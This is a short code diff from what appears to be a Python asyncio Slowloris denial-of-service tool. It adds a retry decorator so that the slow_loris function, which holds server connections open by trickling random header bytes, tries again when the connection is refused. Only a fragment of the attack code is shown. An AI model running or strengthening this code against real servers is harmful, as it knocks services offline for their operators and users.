@@ -4,6 +4,8 @@ from functools import partial
 import random
 from typing import Callable, Generator
 
+from .utils import retry
+
 
 async def headers(
     random_sleep: Callable[[], float] = lambda: 1
@@ -14,6 +16,7 @@ async def headers(
         yield random.randbytes(8) + '\r\n'.encode('ascii')
 
 
+@retry(on=ConnectionRefusedError, retries=3)
 async def slow_loris(address, random_sleep):
     _, server = await asyncio.open_connection(*address)
     async for header in headers(random_sleep):
